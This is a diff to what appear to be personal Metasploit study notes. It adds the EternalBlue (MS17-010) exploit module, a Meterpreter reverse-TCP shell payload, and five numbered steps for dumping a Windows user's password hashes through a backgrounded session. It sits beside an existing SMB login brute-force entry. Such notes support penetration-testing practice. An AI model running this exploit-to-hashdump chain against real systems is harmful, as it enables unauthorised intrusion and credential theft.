@@ -24,5 +24,14 @@ services -S netbios                        - seach services(in open ports) that 
 
 MODULES:
 scanner/smb/smb_login                      - bruteforce smb login
+windows/smb/ms17_010_eternalblue           - exploiting ms17_010 vulnerability
 
+PAYLOADS:
+windows/x64/meterpreter/reverse_tcp        - revers shell via meterpreter(use with ms17_010)
 
+get hash of the user's password:
+1) module  - windows/smb/ms17_010_eternalblue
+2) payload - windows/x64/meterpreter/reverse_tcp
+3) create session and background it(ctrl + z)
+4) module - windows/gather/hashdump(set session the background session)
+5) run
